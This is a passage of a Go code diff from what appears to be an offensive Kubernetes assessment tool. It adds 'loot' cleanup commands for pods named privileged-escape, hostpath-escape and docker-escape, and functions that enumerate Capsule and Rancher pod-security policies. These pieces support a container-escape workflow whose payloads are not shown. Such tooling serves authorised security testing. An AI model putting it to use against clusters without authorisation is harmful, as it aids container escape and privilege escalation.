+		loot.Section("pod-admission").Add("#")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Add("# CLEANUP")
+		loot.Section("pod-admission").Add("# ─────────────────────────────────────────────────────────────")
+		loot.Section("pod-admission").Addf("kubectl delete pod privileged-escape -n %s", finding.Namespace)
+		loot.Section("pod-admission").Addf("kubectl delete pod hostpath-escape -n %s", finding.Namespace)
+		loot.Section("pod-admission").Addf("kubectl delete pod docker-escape -n %s", finding.Namespace)
+		loot.Section("pod-admission").Add("")
 	}
 }
 
@@ -4425,4 +5025,241 @@ func filterAzureWorkloadIdentitiesByNamespace(identities []AzureWorkloadIdentity
 		}
 	}
 	return filtered
+}
+
+// ============================================================================
+// Multitenancy Platform Pod Policy Analysis (Capsule, Rancher)
+// ============================================================================
+
+// CapsuleTenantPodPolicyInfo represents Capsule tenant pod security restrictions
+type CapsuleTenantPodPolicyInfo struct {
+	TenantName              string
+	Namespace               string
+	PodSecurityStandard     string   // privileged, baseline, restricted
+	AllowedRuntimeClasses   []string
+	AllowedPriorityClasses  []string
+	ForbiddenAnnotations    []string
+	ForbiddenLabels         []string
+	ContainerRegistries     []string // Allowed container registries
+	NodeSelector            map[string]string
+	HasResourceQuotas       bool
+	HasLimitRanges          bool
+}
+
+// RancherProjectPodPolicyInfo represents Rancher project pod security restrictions
+type RancherProjectPodPolicyInfo struct {
+	ProjectName             string
+	ProjectID               string
+	Namespace               string
+	PSPTemplateID           string
+	ContainerResourceLimit  bool
+	NamespaceResourceQuota  bool
+	HasPodSecurityPolicy    bool
+}
+
+// analyzeCapsuleTenantPodPolicies analyzes Capsule tenant pod restrictions
+func analyzeCapsuleTenantPodPolicies(ctx context.Context, dynClient dynamic.Interface) []CapsuleTenantPodPolicyInfo {
+	var policies []CapsuleTenantPodPolicyInfo
+
+	gvr := schema.GroupVersionResource{
+		Group:    "capsule.clastix.io",
+		Version:  "v1beta2",
+		Resource: "tenants",
+	}
+
+	list, err := dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
+	if err != nil {
+		// Try v1beta1
+		gvr.Version = "v1beta1"
+		list, err = dynClient.Resource(gvr).List(ctx, metav1.ListOptions{})
+		if err != nil {
+			return policies
+		}
+	}
+
+	for _, item := range list.Items {
+		info := CapsuleTenantPodPolicyInfo{
+			TenantName:   item.GetName(),
+			NodeSelector: make(map[string]string),
+		}
+
+		if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
+			// Pod security standard (PSA)
+			if podOptions, ok := spec["podOptions"].(map[string]interface{}); ok {
+				if psa, ok := podOptions["additionalMetadata"].(map[string]interface{}); ok {
+					// Check for pod-security.kubernetes.io labels
+					if labels, ok := psa["labels"].(map[string]interface{}); ok {
+						if enforce, ok := labels["pod-security.kubernetes.io/enforce"].(string); ok {
+							info.PodSecurityStandard = enforce
+						}
+					}
+				}
+			}
+
+			// Runtime classes
+			if runtimeClasses, ok := spec["runtimeClasses"].(map[string]interface{}); ok {
+				if allowed, ok := runtimeClasses["allowed"].([]interface{}); ok {
+					for _, rc := range allowed {
+						if rcStr, ok := rc.(string); ok {
+							info.AllowedRuntimeClasses = append(info.AllowedRuntimeClasses, rcStr)
+						}
+					}
+				}
+			}
+
+			// Priority classes
+			if priorityClasses, ok := spec["priorityClasses"].(map[string]interface{}); ok {
+				if allowed, ok := priorityClasses["allowed"].([]interface{}); ok {
+					for _, pc := range allowed {
+						if pcStr, ok := pc.(string); ok {
+							info.AllowedPriorityClasses = append(info.AllowedPriorityClasses, pcStr)
+						}
+					}
+				}
+			}
+
+			// Container registries
+			if registries, ok := spec["containerRegistries"].(map[string]interface{}); ok {
+				if allowed, ok := registries["allowed"].([]interface{}); ok {
+					for _, reg := range allowed {
+						if regStr, ok := reg.(string); ok {
+							info.ContainerRegistries = append(info.ContainerRegistries, regStr)
+						}
+					}
+				}
+			}
+
+			// Forbidden annotations
+			if forbiddenAnno, ok := spec["forbiddenAnnotations"].(map[string]interface{}); ok {
+				if denied, ok := forbiddenAnno["denied"].([]interface{}); ok {
+					for _, a := range denied {
+						if aStr, ok := a.(string); ok {
+							info.ForbiddenAnnotations = append(info.ForbiddenAnnotations, aStr)
+						}
+					}
+				}
+			}
+
+			// Forbidden labels
+			if forbiddenLabels, ok := spec["forbiddenLabels"].(map[string]interface{}); ok {
+				if denied, ok := forbiddenLabels["denied"].([]interface{}); ok {
+					for _, l := range denied {
+						if lStr, ok := l.(string); ok {
+							info.ForbiddenLabels = append(info.ForbiddenLabels, lStr)
+						}
+					}
+				}
+			}
+
+			// Node selector
+			if nodeSelector, ok := spec["nodeSelector"].(map[string]interface{}); ok {
+				for k, v := range nodeSelector {
+					if vStr, ok := v.(string); ok {
+						info.NodeSelector[k] = vStr
+					}
+				}
+			}
+
+			// Resource quotas
+			if _, ok := spec["resourceQuotas"].(map[string]interface{}); ok {
+				info.HasResourceQuotas = true
+			}
+
+			// Limit ranges
+			if _, ok := spec["limitRanges"].(map[string]interface{}); ok {
+				info.HasLimitRanges = true
+			}
+		}
+
+		// Get namespaces owned by tenant
+		if status, ok := item.Object["status"].(map[string]interface{}); ok {
+			if namespaces, ok := status["namespaces"].([]interface{}); ok {
+				for _, ns := range namespaces {
+					if nsStr, ok := ns.(string); ok {
+						infoCopy := info
+						infoCopy.Namespace = nsStr
+						policies = append(policies, infoCopy)
+					}
+				}
+			}
+		}
+
+		// If no namespaces in status, still add the policy
+		if len(policies) == 0 || policies[len(policies)-1].TenantName != info.TenantName {
+			policies = append(policies, info)
+		}
+	}
+
+	return policies
+}
+
+// analyzeRancherProjectPodPolicies analyzes Rancher project pod security configurations
+func analyzeRancherProjectPodPolicies(ctx context.Context, dynClient dynamic.Interface) []RancherProjectPodPolicyInfo {
+	var policies []RancherProjectPodPolicyInfo
+
+	// Projects
+	projectGVR := schema.GroupVersionResource{
+		Group:    "management.cattle.io",
+		Version:  "v3",
+		Resource: "projects",
+	}
+
+	projectList, err := dynClient.Resource(projectGVR).List(ctx, metav1.ListOptions{})
+	if err != nil {
+		return policies
+	}
+
+	for _, item := range projectList.Items {
+		info := RancherProjectPodPolicyInfo{
+			ProjectName: item.GetName(),
+		}
+
+		if spec, ok := item.Object["spec"].(map[string]interface{}); ok {
+			if projectID, ok := spec["projectId"].(string); ok {
+				info.ProjectID = projectID
+			}
+
+			// Check for container default resource limits
+			if _, ok := spec["containerDefaultResourceLimit"].(map[string]interface{}); ok {
+				info.ContainerResourceLimit = true
+			}
+
+			// Check for namespace default resource quota
+			if _, ok := spec["namespaceDefaultResourceQuota"].(map[string]interface{}); ok {
+				info.NamespaceResourceQuota = true
+			}
+		}
+
+		// Get annotations for PSP template
+		annotations := item.GetAnnotations()
+		if pspTemplate, ok := annotations["field.cattle.io/projectDefaultPodSecurityPolicyTemplateName"]; ok {
+			info.PSPTemplateID = pspTemplate
+			info.HasPodSecurityPolicy = true
+		}
+
+		policies = append(policies, info)
+	}
+
+	// Also check PodSecurityPolicyTemplate CRD
+	pspGVR := schema.GroupVersionResource{
+		Group:    "management.cattle.io",
+		Version:  "v3",
+		Resource: "podsecuritypolicytemplates",
+	}
+
+	pspList, err := dynClient.Resource(pspGVR).List(ctx, metav1.ListOptions{})
+	if err == nil {
+		// Just count how many PSP templates exist
+		for _, item := range pspList.Items {
+			// Add as standalone policy info
+			info := RancherProjectPodPolicyInfo{
+				ProjectName:          item.GetName(),
+				PSPTemplateID:        item.GetName(),
+				HasPodSecurityPolicy: true,
+			}
+			policies = append(policies, info)
+		}
+	}
+
+	return policies
 }
